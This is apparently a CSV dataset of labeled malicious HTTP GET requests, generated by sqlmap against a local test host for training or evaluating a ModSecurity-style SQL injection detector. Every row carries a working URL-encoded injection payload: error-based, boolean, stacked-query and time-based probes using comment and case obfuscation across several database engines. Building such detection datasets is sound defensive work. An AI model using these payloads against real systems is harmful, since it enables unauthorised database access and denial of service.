"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_modsec_learn_sqli_002490","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28sELECT%2F%2A%2A%2F8082%2F%2A%2A%2FFrom%28sELECT%2F%2A%2A%2FcouNt%28%2A%29%2CCOnCat%28CONCAT%28CHAR%28113%29%2CCHAR%2898%29%2CCHAR%28122%29%2CCHAR%28106%29%2CCHAR%28113%29%29%2C%28sELECT%2F%2A%2A%2F%28eLT%288082%3D8082%2C1%29%29%29%2CCONCAT%28CHAR%28113%29%2CCHAR%28118%29%2CCHAR%28106%29%2CCHAR%28112%29%2CCHAR%28113%29%29%2CFLoOr%28RANd%280%29%2A2%29%29x%2F%2A%2A%2FFrom%2F%2A%2A%2FINFORMATION_SCHEMA.PlUgIns%2F%2A%2A%2FGrOup%2F%2A%2A%2FbY%2F%2A%2A%2Fx%29a%29--%2F%2A%2A%2FXmoo","/","p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28sELECT%2F%2A%2A%2F8082%2F%2A%2A%2FFrom%28sELECT%2F%2A%2A%2FcouNt%28%2A%29%2CCOnCat%28CONCAT%28CHAR%28113%29%2CCHAR%2898%29%2CCHAR%28122%29%2CCHAR%28106%29%2CCHAR%28113%29%29%2C%28sELECT%2F%2A%2A%2F%28eLT%288082%3D8082%2C1%29%29%29%2CCONCAT%28CHAR%28113%29%2CCHAR%28118%29%2CCHAR%28106%29%2CCHAR%28112%29%2CCHAR%28113%29%29%2CFLoOr%28RANd%280%29%2A2%29%29x%2F%2A%2A%2FFrom%2F%2A%2A%2FINFORMATION_SCHEMA.PlUgIns%2F%2A%2A%2FGrOup%2F%2A%2A%2FbY%2F%2A%2A%2Fx%29a%29--%2F%2A%2A%2FXmoo","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28sELECT%2F%2A%2A%2F8082%2F%2A%2A%2FFrom%28sELECT%2F%2A%2A%2FcouNt%28%2A%29%2CCOnCat%28CONCAT%28CHAR%28113%29%2CCHAR%2898%29%2CCHAR%28122%29%2CCHAR%28106%29%2CCHAR%28113%29%29%2C%28sELECT%2F%2A%2A%2F%28eLT%288082%3D8082%2C1%29%29%29%2CCONCAT%28CHAR%28113%29%2CCHAR%28118%29%2CCHAR%28106%29%2CCHAR%28112%29%2CCHAR%28113%29%29%2CFLoOr%28RANd%280%29%2A2%29%29x%2F%2A%2A%2FFrom%2F%2A%2A%2FINFORMATION_SCHEMA.PlUgIns%2F%2A%2A%2FGrOup%2F%2A%2A%2FbY%2F%2A%2A%2Fx%29a%29--%2F%2A%2A%2FXmoo HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002491","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F3537%3DcAsT%28%28Chr%28113%29%7C%7CChr%2898%29%7C%7CChr%28122%29%7C%7CChr%28106%29%7C%7CChr%28113%29%29%7C%7C%28SElEct%2F%2A%2A%2F%28cAsE%2F%2A%2A%2FwHeN%2F%2A%2A%2F%283537%3D3537%29%2F%2A%2A%2FthEN%2F%2A%2A%2FBItCounT%28biTsTring_To_BiNARy%28%28Chr%2849%29%29%29%29%2F%2A%2A%2FELsE%2F%2A%2A%2FBItCounT%28biTsTring_To_BiNARy%28%28Chr%2848%29%29%29%29%2F%2A%2A%2FENd%29%29%3A%3AvarChaR%7C%7C%28Chr%28113%29%7C%7CChr%28118%29%7C%7CChr%28106%29%7C%7CChr%28112%29%7C%7CChr%28113%29%29%2F%2A%2A%2FAs%2F%2A%2A%2FNUmeRIC%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%27PeDJ%27%3D%27PeDJ","/","p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F3537%3DcAsT%28%28Chr%28113%29%7C%7CChr%2898%29%7C%7CChr%28122%29%7C%7CChr%28106%29%7C%7CChr%28113%29%29%7C%7C%28SElEct%2F%2A%2A%2F%28cAsE%2F%2A%2A%2FwHeN%2F%2A%2A%2F%283537%3D3537%29%2F%2A%2A%2FthEN%2F%2A%2A%2FBItCounT%28biTsTring_To_BiNARy%28%28Chr%2849%29%29%29%29%2F%2A%2A%2FELsE%2F%2A%2A%2FBItCounT%28biTsTring_To_BiNARy%28%28Chr%2848%29%29%29%29%2F%2A%2A%2FENd%29%29%3A%3AvarChaR%7C%7C%28Chr%28113%29%7C%7CChr%28118%29%7C%7CChr%28106%29%7C%7CChr%28112%29%7C%7CChr%28113%29%29%2F%2A%2A%2FAs%2F%2A%2A%2FNUmeRIC%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%27PeDJ%27%3D%27PeDJ","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F3537%3DcAsT%28%28Chr%28113%29%7C%7CChr%2898%29%7C%7CChr%28122%29%7C%7CChr%28106%29%7C%7CChr%28113%29%29%7C%7C%28SElEct%2F%2A%2A%2F%28cAsE%2F%2A%2A%2FwHeN%2F%2A%2A%2F%283537%3D3537%29%2F%2A%2A%2FthEN%2F%2A%2A%2FBItCounT%28biTsTring_To_BiNARy%28%28Chr%2849%29%29%29%29%2F%2A%2A%2FELsE%2F%2A%2A%2FBItCounT%28biTsTring_To_BiNARy%28%28Chr%2848%29%29%29%29%2F%2A%2A%2FENd%29%29%3A%3AvarChaR%7C%7C%28Chr%28113%29%7C%7CChr%28118%29%7C%7CChr%28106%29%7C%7CChr%28112%29%7C%7CChr%28113%29%29%2F%2A%2A%2FAs%2F%2A%2A%2FNUmeRIC%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%27PeDJ%27%3D%27PeDJ HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002492","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F7225%3D%28SELEcT%2F%2A%2A%2FCount%28%2A%29%2F%2A%2A%2FFrOm%2F%2A%2A%2FINFORMATION_SCHEMA.CoLUmnS%2F%2A%2A%2FA%2C%2F%2A%2A%2FINFORMATION_SCHEMA.CoLUmnS%2F%2A%2A%2FB%2C%2F%2A%2A%2FINFORMATION_SCHEMA.CoLUmnS%2F%2A%2A%2FC%2F%2A%2A%2FWhErE%2F%2A%2A%2F0%2F%2A%2A%2FxOr%2F%2A%2A%2F1%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%27ZiGh%27%3D%27ZiGh","/","p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F7225%3D%28SELEcT%2F%2A%2A%2FCount%28%2A%29%2F%2A%2A%2FFrOm%2F%2A%2A%2FINFORMATION_SCHEMA.CoLUmnS%2F%2A%2A%2FA%2C%2F%2A%2A%2FINFORMATION_SCHEMA.CoLUmnS%2F%2A%2A%2FB%2C%2F%2A%2A%2FINFORMATION_SCHEMA.CoLUmnS%2F%2A%2A%2FC%2F%2A%2A%2FWhErE%2F%2A%2A%2F0%2F%2A%2A%2FxOr%2F%2A%2A%2F1%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%27ZiGh%27%3D%27ZiGh","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F7225%3D%28SELEcT%2F%2A%2A%2FCount%28%2A%29%2F%2A%2A%2FFrOm%2F%2A%2A%2FINFORMATION_SCHEMA.CoLUmnS%2F%2A%2A%2FA%2C%2F%2A%2A%2FINFORMATION_SCHEMA.CoLUmnS%2F%2A%2A%2FB%2C%2F%2A%2A%2FINFORMATION_SCHEMA.CoLUmnS%2F%2A%2A%2FC%2F%2A%2A%2FWhErE%2F%2A%2A%2F0%2F%2A%2A%2FxOr%2F%2A%2A%2F1%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%27ZiGh%27%3D%27ZiGh HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002493","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F8098%3D%28SeLECt%2F%2A%2A%2FCOUnt%28%2A%29%2F%2A%2A%2FFrOm%2F%2A%2A%2FSYSMASTER%3ASYSPAGHDR%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%27XQQu%27%2F%2A%2A%2FlIKE%2F%2A%2A%2F%27XQQu","/","p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F8098%3D%28SeLECt%2F%2A%2A%2FCOUnt%28%2A%29%2F%2A%2A%2FFrOm%2F%2A%2A%2FSYSMASTER%3ASYSPAGHDR%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%27XQQu%27%2F%2A%2A%2FlIKE%2F%2A%2A%2F%27XQQu","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F8098%3D%28SeLECt%2F%2A%2A%2FCOUnt%28%2A%29%2F%2A%2A%2FFrOm%2F%2A%2A%2FSYSMASTER%3ASYSPAGHDR%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%27XQQu%27%2F%2A%2A%2FlIKE%2F%2A%2A%2F%27XQQu HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002494","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F8098%3D%28sElECT%2F%2A%2A%2FcoUNt%28%2A%29%2F%2A%2A%2FFRom%2F%2A%2A%2FSYSMASTER%3ASYSPAGHDR%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%27SUfg%27%3D%27SUfg","/","p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F8098%3D%28sElECT%2F%2A%2A%2FcoUNt%28%2A%29%2F%2A%2A%2FFRom%2F%2A%2A%2FSYSMASTER%3ASYSPAGHDR%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%27SUfg%27%3D%27SUfg","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F8098%3D%28sElECT%2F%2A%2A%2FcoUNt%28%2A%29%2F%2A%2A%2FFRom%2F%2A%2A%2FSYSMASTER%3ASYSPAGHDR%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%27SUfg%27%3D%27SUfg HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002495","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F8098%3D%28seLEct%2F%2A%2A%2FcoUNT%28%2A%29%2F%2A%2A%2FFrOm%2F%2A%2A%2FSYSMASTER%3ASYSPAGHDR%29--%2F%2A%2A%2FPNIX","/","p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F8098%3D%28seLEct%2F%2A%2A%2FcoUNT%28%2A%29%2F%2A%2A%2FFrOm%2F%2A%2A%2FSYSMASTER%3ASYSPAGHDR%29--%2F%2A%2A%2FPNIX","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FANd%2F%2A%2A%2F8098%3D%28seLEct%2F%2A%2A%2FcoUNT%28%2A%29%2F%2A%2A%2FFrOm%2F%2A%2A%2FSYSMASTER%3ASYSPAGHDR%29--%2F%2A%2A%2FPNIX HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002496","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FAnD%2F%2A%2A%2F3446%3DLiKe%28chAr%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CuPpeR%28hEX%28RAnDOMBLOB%28500000000%2F2%29%29%29%29%2F%2A%2A%2FAnD%2F%2A%2A%2F%28%27orvB%27%2F%2A%2A%2FLiKe%2F%2A%2A%2F%27orvB","/","p=%27%29%2F%2A%2A%2FAnD%2F%2A%2A%2F3446%3DLiKe%28chAr%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CuPpeR%28hEX%28RAnDOMBLOB%28500000000%2F2%29%29%29%29%2F%2A%2A%2FAnD%2F%2A%2A%2F%28%27orvB%27%2F%2A%2A%2FLiKe%2F%2A%2A%2F%27orvB","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FAnD%2F%2A%2A%2F3446%3DLiKe%28chAr%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CuPpeR%28hEX%28RAnDOMBLOB%28500000000%2F2%29%29%29%29%2F%2A%2A%2FAnD%2F%2A%2A%2F%28%27orvB%27%2F%2A%2A%2FLiKe%2F%2A%2A%2F%27orvB HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002497","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FAnd%2F%2A%2A%2F5652%3DrAisE_ERRoR%28cHR%2855%29%7C%7CcHR%2848%29%7C%7CcHR%2848%29%7C%7CcHR%2848%29%7C%7CcHR%2849%29%2CcHR%28113%29%7C%7CcHR%2898%29%7C%7CcHR%28122%29%7C%7CcHR%28106%29%7C%7CcHR%28113%29%7C%7C%28seLect%2F%2A%2A%2F%28CasE%2F%2A%2A%2FwHeN%2F%2A%2A%2F%285652%3D5652%29%2F%2A%2A%2FthEN%2F%2A%2A%2F1%2F%2A%2A%2FeLSe%2F%2A%2A%2F0%2F%2A%2A%2FeND%29%2F%2A%2A%2FFroM%2F%2A%2A%2FSYSIBM.SYSDUMMY1%29%7C%7CcHR%28113%29%7C%7CcHR%28118%29%7C%7CcHR%28106%29%7C%7CcHR%28112%29%7C%7CcHR%28113%29%29%2F%2A%2A%2FAnd%2F%2A%2A%2F%28%27jUdA%27%3D%27jUdA","/","p=%27%29%2F%2A%2A%2FAnd%2F%2A%2A%2F5652%3DrAisE_ERRoR%28cHR%2855%29%7C%7CcHR%2848%29%7C%7CcHR%2848%29%7C%7CcHR%2848%29%7C%7CcHR%2849%29%2CcHR%28113%29%7C%7CcHR%2898%29%7C%7CcHR%28122%29%7C%7CcHR%28106%29%7C%7CcHR%28113%29%7C%7C%28seLect%2F%2A%2A%2F%28CasE%2F%2A%2A%2FwHeN%2F%2A%2A%2F%285652%3D5652%29%2F%2A%2A%2FthEN%2F%2A%2A%2F1%2F%2A%2A%2FeLSe%2F%2A%2A%2F0%2F%2A%2A%2FeND%29%2F%2A%2A%2FFroM%2F%2A%2A%2FSYSIBM.SYSDUMMY1%29%7C%7CcHR%28113%29%7C%7CcHR%28118%29%7C%7CcHR%28106%29%7C%7CcHR%28112%29%7C%7CcHR%28113%29%29%2F%2A%2A%2FAnd%2F%2A%2A%2F%28%27jUdA%27%3D%27jUdA","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FAnd%2F%2A%2A%2F5652%3DrAisE_ERRoR%28cHR%2855%29%7C%7CcHR%2848%29%7C%7CcHR%2848%29%7C%7CcHR%2848%29%7C%7CcHR%2849%29%2CcHR%28113%29%7C%7CcHR%2898%29%7C%7CcHR%28122%29%7C%7CcHR%28106%29%7C%7CcHR%28113%29%7C%7C%28seLect%2F%2A%2A%2F%28CasE%2F%2A%2A%2FwHeN%2F%2A%2A%2F%285652%3D5652%29%2F%2A%2A%2FthEN%2F%2A%2A%2F1%2F%2A%2A%2FeLSe%2F%2A%2A%2F0%2F%2A%2A%2FeND%29%2F%2A%2A%2FFroM%2F%2A%2A%2FSYSIBM.SYSDUMMY1%29%7C%7CcHR%28113%29%7C%7CcHR%28118%29%7C%7CcHR%28106%29%7C%7CcHR%28112%29%7C%7CcHR%28113%29%29%2F%2A%2A%2FAnd%2F%2A%2A%2F%28%27jUdA%27%3D%27jUdA HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002498","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FAnd%2F%2A%2A%2F8626%3D%28seLeCT%2F%2A%2A%2FcoUNt%28%2A%29%2F%2A%2A%2FFrom%2F%2A%2A%2FSYSIBM.SYSTABLES%2F%2A%2A%2FAs%2F%2A%2A%2FT1%2CSYSIBM.SYSTABLES%2F%2A%2A%2FAs%2F%2A%2A%2FT2%2CSYSIBM.SYSTABLES%2F%2A%2A%2FAs%2F%2A%2A%2FT3%29%2F%2A%2A%2FAnd%2F%2A%2A%2F%28%27sTVz%27%2F%2A%2A%2FliKe%2F%2A%2A%2F%27sTVz","/","p=%27%29%2F%2A%2A%2FAnd%2F%2A%2A%2F8626%3D%28seLeCT%2F%2A%2A%2FcoUNt%28%2A%29%2F%2A%2A%2FFrom%2F%2A%2A%2FSYSIBM.SYSTABLES%2F%2A%2A%2FAs%2F%2A%2A%2FT1%2CSYSIBM.SYSTABLES%2F%2A%2A%2FAs%2F%2A%2A%2FT2%2CSYSIBM.SYSTABLES%2F%2A%2A%2FAs%2F%2A%2A%2FT3%29%2F%2A%2A%2FAnd%2F%2A%2A%2F%28%27sTVz%27%2F%2A%2A%2FliKe%2F%2A%2A%2F%27sTVz","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FAnd%2F%2A%2A%2F8626%3D%28seLeCT%2F%2A%2A%2FcoUNt%28%2A%29%2F%2A%2A%2FFrom%2F%2A%2A%2FSYSIBM.SYSTABLES%2F%2A%2A%2FAs%2F%2A%2A%2FT1%2CSYSIBM.SYSTABLES%2F%2A%2A%2FAs%2F%2A%2A%2FT2%2CSYSIBM.SYSTABLES%2F%2A%2A%2FAs%2F%2A%2A%2FT3%29%2F%2A%2A%2FAnd%2F%2A%2A%2F%28%27sTVz%27%2F%2A%2A%2FliKe%2F%2A%2A%2F%27sTVz HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002499","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FAs%2F%2A%2A%2FCAnu%2F%2A%2A%2FwHERe%2F%2A%2A%2F2868%3D2868%2F%2A%2A%2FAnd%2F%2A%2A%2F8836%3D%28SeleCT%2F%2A%2A%2FCOunt%28%2A%29%2F%2A%2A%2FfRoM%2F%2A%2A%2FSYSMAsTER%3ASYSPAGHDR%29--","/","p=%27%29%2F%2A%2A%2FAs%2F%2A%2A%2FCAnu%2F%2A%2A%2FwHERe%2F%2A%2A%2F2868%3D2868%2F%2A%2A%2FAnd%2F%2A%2A%2F8836%3D%28SeleCT%2F%2A%2A%2FCOunt%28%2A%29%2F%2A%2A%2FfRoM%2F%2A%2A%2FSYSMAsTER%3ASYSPAGHDR%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FAs%2F%2A%2A%2FCAnu%2F%2A%2A%2FwHERe%2F%2A%2A%2F2868%3D2868%2F%2A%2A%2FAnd%2F%2A%2A%2F8836%3D%28SeleCT%2F%2A%2A%2FCOunt%28%2A%29%2F%2A%2A%2FfRoM%2F%2A%2A%2FSYSMAsTER%3ASYSPAGHDR%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002500","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FAs%2F%2A%2A%2FCmAP%2F%2A%2A%2FWHeRe%2F%2A%2A%2F1937%3D1937%2F%2A%2A%2FOr%2F%2A%2A%2F5155%3D%28SeLECt%2F%2A%2A%2FCouNt%28%2A%29%2F%2A%2A%2FfROM%2F%2A%2A%2FINFOrMATION_SCHEMA.ColUMNs%2F%2A%2A%2FA%2C%2F%2A%2A%2FINFOrMATION_SCHEMA.ColUMNs%2F%2A%2A%2FB%2C%2F%2A%2A%2FINFOrMATION_SCHEMA.ColUMNs%2F%2A%2A%2FC%2F%2A%2A%2FWHeRe%2F%2A%2A%2F0%2F%2A%2A%2FXOr%2F%2A%2A%2F1%29%23","/","p=%27%29%2F%2A%2A%2FAs%2F%2A%2A%2FCmAP%2F%2A%2A%2FWHeRe%2F%2A%2A%2F1937%3D1937%2F%2A%2A%2FOr%2F%2A%2A%2F5155%3D%28SeLECt%2F%2A%2A%2FCouNt%28%2A%29%2F%2A%2A%2FfROM%2F%2A%2A%2FINFOrMATION_SCHEMA.ColUMNs%2F%2A%2A%2FA%2C%2F%2A%2A%2FINFOrMATION_SCHEMA.ColUMNs%2F%2A%2A%2FB%2C%2F%2A%2A%2FINFOrMATION_SCHEMA.ColUMNs%2F%2A%2A%2FC%2F%2A%2A%2FWHeRe%2F%2A%2A%2F0%2F%2A%2A%2FXOr%2F%2A%2A%2F1%29%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FAs%2F%2A%2A%2FCmAP%2F%2A%2A%2FWHeRe%2F%2A%2A%2F1937%3D1937%2F%2A%2A%2FOr%2F%2A%2A%2F5155%3D%28SeLECt%2F%2A%2A%2FCouNt%28%2A%29%2F%2A%2A%2FfROM%2F%2A%2A%2FINFOrMATION_SCHEMA.ColUMNs%2F%2A%2A%2FA%2C%2F%2A%2A%2FINFOrMATION_SCHEMA.ColUMNs%2F%2A%2A%2FB%2C%2F%2A%2A%2FINFOrMATION_SCHEMA.ColUMNs%2F%2A%2A%2FC%2F%2A%2A%2FWHeRe%2F%2A%2A%2F0%2F%2A%2A%2FXOr%2F%2A%2A%2F1%29%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002501","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FAs%2F%2A%2A%2FIPSq%2F%2A%2A%2FWHEre%2F%2A%2A%2F9283%3D9283%2F%2A%2A%2FOr%2F%2A%2A%2FChaR%2897%29%7C%7CChaR%2874%29%7C%7CChaR%28113%29%7C%7CChaR%2897%29%3DREgeXp_subStRInG%28REPeAT%28RiGht%28ChaR%286711%29%2C0%29%2C5000000000%29%2CNUlL%29--%2F%2A%2A%2FUWNG","/","p=%27%29%2F%2A%2A%2FAs%2F%2A%2A%2FIPSq%2F%2A%2A%2FWHEre%2F%2A%2A%2F9283%3D9283%2F%2A%2A%2FOr%2F%2A%2A%2FChaR%2897%29%7C%7CChaR%2874%29%7C%7CChaR%28113%29%7C%7CChaR%2897%29%3DREgeXp_subStRInG%28REPeAT%28RiGht%28ChaR%286711%29%2C0%29%2C5000000000%29%2CNUlL%29--%2F%2A%2A%2FUWNG","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FAs%2F%2A%2A%2FIPSq%2F%2A%2A%2FWHEre%2F%2A%2A%2F9283%3D9283%2F%2A%2A%2FOr%2F%2A%2A%2FChaR%2897%29%7C%7CChaR%2874%29%7C%7CChaR%28113%29%7C%7CChaR%2897%29%3DREgeXp_subStRInG%28REPeAT%28RiGht%28ChaR%286711%29%2C0%29%2C5000000000%29%2CNUlL%29--%2F%2A%2A%2FUWNG HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002502","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%2F%2A%2A%2FAs%2F%2A%2A%2FLXdh%2F%2A%2A%2FwheRe%2F%2A%2A%2F9214%3D9214%3BsELeCT%2F%2A%2A%2F%28CAsE%2F%2A%2A%2FwHEN%2F%2A%2A%2F%284026%3D7956%29%2F%2A%2A%2FtheN%2F%2A%2A%2F1%2F%2A%2A%2FeLsE%2F%2A%2A%2F4026%2A%28sELeCT%2F%2A%2A%2F4026%2F%2A%2A%2FunION%2F%2A%2A%2FaLL%2F%2A%2A%2FsELeCT%2F%2A%2A%2F7956%29%2F%2A%2A%2FeNd%29--","/","p=%27%29%2F%2A%2A%2FAs%2F%2A%2A%2FLXdh%2F%2A%2A%2FwheRe%2F%2A%2A%2F9214%3D9214%3BsELeCT%2F%2A%2A%2F%28CAsE%2F%2A%2A%2FwHEN%2F%2A%2A%2F%284026%3D7956%29%2F%2A%2A%2FtheN%2F%2A%2A%2F1%2F%2A%2A%2FeLsE%2F%2A%2A%2F4026%2A%28sELeCT%2F%2A%2A%2F4026%2F%2A%2A%2FunION%2F%2A%2A%2FaLL%2F%2A%2A%2FsELeCT%2F%2A%2A%2F7956%29%2F%2A%2A%2FeNd%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%2F%2A%2A%2FAs%2F%2A%2A%2FLXdh%2F%2A%2A%2FwheRe%2F%2A%2A%2F9214%3D9214%3BsELeCT%2F%2A%2A%2F%28CAsE%2F%2A%2A%2FwHEN%2F%2A%2A%2F%284026%3D7956%29%2F%2A%2A%2FtheN%2F%2A%2A%2F1%2F%2A%2A%2FeLsE%2F%2A%2A%2F4026%2A%28sELeCT%2F%2A%2A%2F4026%2F%2A%2A%2FunION%2F%2A%2A%2FaLL%2F%2A%2A%2FsELeCT%2F%2A%2A%2F7956%29%2F%2A%2A%2FeNd%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
